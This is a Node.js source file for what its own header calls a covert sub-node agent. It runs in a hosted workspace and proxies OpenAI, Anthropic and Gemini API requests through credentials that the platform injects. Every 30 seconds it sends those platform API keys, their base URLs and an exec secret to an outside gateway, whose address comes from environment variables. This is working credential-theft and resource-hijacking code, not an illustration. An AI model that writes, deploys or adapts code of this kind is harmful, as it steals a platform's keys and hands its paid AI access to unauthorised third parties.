#!/usr/bin/env node
/**
 * Reseek 隐蔽子节点 Agent
 * 运行在 Reseek 工作区，通过 AI Integrations 代理 AI 请求，
 * 启动后自动向主节点网关 self-register。
 */
"use strict";
const http  = require("http");
const https = require("https");
const url   = require("url");

const PORT        = parseInt(process.env.PORT || "3000", 10);
const UPSTREAM    = (process.env.SYNC_ENDPOINT || process.env.SELF_REGISTER_URL || "").replace(/\/$/, "");
const MY_URL      = process.env.MY_GATEWAY_URL ||
                    (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : "") ||
                    (process.env.REPLIT_DOMAINS    ? `https://${process.env.REPLIT_DOMAINS.split(",")[0].trim()}` : "");
const NODE_NAME   = process.env.NODE_NAME ||
                    process.env.REPL_OWNER ||
                    process.env.REPLIT_OWNER ||
                    "reseek-agent";
const EXEC_SECRET = process.env.EXEC_SECRET || "";

// AI Integration 凭据（Reseek 平台注入）
const OAI_BASE  = process.env.AI_INTEGRATIONS_OPENAI_BASE_URL    || "";
const OAI_KEY   = process.env.AI_INTEGRATIONS_OPENAI_API_KEY     || "";
const ANT_BASE  = process.env.AI_INTEGRATIONS_ANTHROPIC_BASE_URL || "";
const ANT_KEY   = process.env.AI_INTEGRATIONS_ANTHROPIC_API_KEY  || "";
const GEM_BASE  = process.env.AI_INTEGRATIONS_GEMINI_BASE_URL    || "";
const GEM_KEY   = process.env.AI_INTEGRATIONS_GEMINI_API_KEY     || "";

const STATIC_MODELS = [
  { id: "gpt-4o",            object: "model", created: 1706745938, owned_by: "system" },
  { id: "gpt-4o-mini",       object: "model", created: 1721172717, owned_by: "system" },
  { id: "gpt-4-turbo",       object: "model", created: 1712361441, owned_by: "system" },
  { id: "gpt-3.5-turbo",     object: "model", created: 1677610602, owned_by: "system" },
  { id: "claude-3-5-sonnet-20241022", object: "model", created: 1729555200, owned_by: "system" },
];

function post(targetUrl, opts) {
  return new Promise((resolve, reject) => {
    const p   = new url.URL(targetUrl);
    const lib = p.protocol === "https:" ? https : http;
    const body = opts.body
      ? (typeof opts.body === "string" ? Buffer.from(opts.body) : Buffer.from(JSON.stringify(opts.body)))
      : null;
    const hdrs = { ...(opts.headers || {}) };
    if (body) hdrs["content-length"] = body.length;
    const req = lib.request({
      hostname: p.hostname,
      port:     p.port || (p.protocol === "https:" ? 443 : 80),
      path:     p.pathname + p.search,
      method:   opts.method || "GET",
      headers:  hdrs,
    }, (res) => {
      let d = "";
      res.on("data", c => d += c);
      res.on("end", () => {
        try { resolve({ status: res.statusCode, data: JSON.parse(d) }); }
        catch { resolve({ status: res.statusCode, data: { raw: d } }); }
      });
    });
    req.on("error", reject);
    if (body) req.write(body);
    req.end();
  });
}

async function heartbeat() {
  if (!MY_URL || !UPSTREAM) return;
  try {
    await post(`${UPSTREAM}/api/gateway/self-register`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: {
        gatewayUrl:       MY_URL,
        name:             NODE_NAME,
        execSecret:       EXEC_SECRET,
        openaiBaseUrl:    OAI_BASE,
        openaiApiKey:     OAI_KEY,
        anthropicBaseUrl: ANT_BASE,
        anthropicApiKey:  ANT_KEY,
        geminiBaseUrl:    GEM_BASE,
        geminiApiKey:     GEM_KEY,
      },
    });
  } catch (_) {}
}

// FIX: collect body as Buffer chunks to avoid corrupting binary data
// FIX: stripPrefix is a RegExp anchored at path start
function pipe(req, res, base, key, stripPrefix) {
  const chunks = [];
  req.on("data", c => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
  req.on("end", () => {
    const body   = Buffer.concat(chunks);
    const reqUrl = stripPrefix ? req.url.replace(stripPrefix, "") : req.url;
    const target = new url.URL(`${base.replace(/\/$/, "")}${reqUrl || "/"}`);
    const lib    = target.protocol === "https:" ? https : http;
    const hdrs   = { ...req.headers, authorization: `Bearer ${key}`, host: target.hostname };
    delete hdrs["content-length"];
    const pr = lib.request({
      hostname: target.hostname,
      port:     target.port || (target.protocol === "https:" ? 443 : 80),
      path:     target.pathname + target.search,
      method:   req.method,
      headers:  { ...hdrs, "content-length": body.length },
    }, up => { res.writeHead(up.statusCode, up.headers); up.pipe(res); });
    pr.on("error", () => { res.writeHead(502); res.end('{"error":"bad gateway"}'); });
    if (body.length) pr.write(body);
    pr.end();
  });
}

const server = http.createServer((req, res) => {
  const path = req.url.split("?")[0];

  if (req.method === "GET" && (path === "/" || path === "/health")) {
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ status: "ok", ts: Date.now() }));
    return;
  }

  if (path === "/v1/models" && req.method === "GET") {
    if (OAI_BASE && OAI_KEY) { pipe(req, res, OAI_BASE, OAI_KEY, null); return; }
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ object: "list", data: STATIC_MODELS }));
    return;
  }

  if (path.startsWith("/v1/")) {
    if (OAI_BASE && OAI_KEY) { pipe(req, res, OAI_BASE, OAI_KEY, null); return; }
    res.writeHead(503, { "Content-Type": "application/json" });
    res.end('{"error":"service unavailable"}');
    return;
  }

  // FIX: use anchored regex /^\/anthropic/ instead of string "/anthropic"
  if (path.startsWith("/anthropic/")) {
    if (ANT_BASE && ANT_KEY) { pipe(req, res, ANT_BASE, ANT_KEY, /^\/anthropic/); return; }
    res.writeHead(503, { "Content-Type": "application/json" });
    res.end('{"error":"service unavailable"}');
    return;
  }

  // FIX: use anchored regex /^\/gemini/ instead of string "/gemini"
  if (path.startsWith("/gemini/")) {
    if (GEM_BASE && GEM_KEY) { pipe(req, res, GEM_BASE, GEM_KEY, /^\/gemini/); return; }
    res.writeHead(503, { "Content-Type": "application/json" });
    res.end('{"error":"service unavailable"}');
    return;
  }

  res.writeHead(404, { "Content-Type": "application/json" });
  res.end('{"error":"not found"}');
});

server.listen(PORT, "0.0.0.0", () => {
  heartbeat();
  setInterval(heartbeat, 30 * 1000);
});
